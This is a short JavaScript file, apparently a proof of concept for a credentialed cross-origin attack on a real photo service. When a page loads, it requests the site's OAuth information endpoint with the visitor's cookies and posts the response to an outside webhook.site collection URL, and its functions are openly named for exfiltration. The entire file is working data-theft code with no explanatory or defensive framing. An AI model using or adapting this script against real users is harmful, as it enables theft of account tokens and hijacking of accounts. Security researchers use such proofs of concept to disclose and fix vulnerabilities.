function exfiltrateData(data) {
    var exfiltrateXhr = new XMLHttpRequest();
    exfiltrateXhr.open('POST', 'https://webhook.site/8e44c277-8cff-4bf6-96bf-e330244737d4', true);
    exfiltrateXhr.setRequestHeader('Content-Type', 'application/json');
    exfiltrateXhr.send(JSON.stringify({ data: data }));
}

function fetchAndExfiltrate() {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://www.snapfish.com/library/getOauthInfo', true);
    xhr.withCredentials = true;
    xhr.onreadystatechange = function() {
        if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
            var response = xhr.responseText;
            exfiltrateData(response);
        }
    };
    xhr.send();
}

window.onload = function() {
    fetchAndExfiltrate();
};
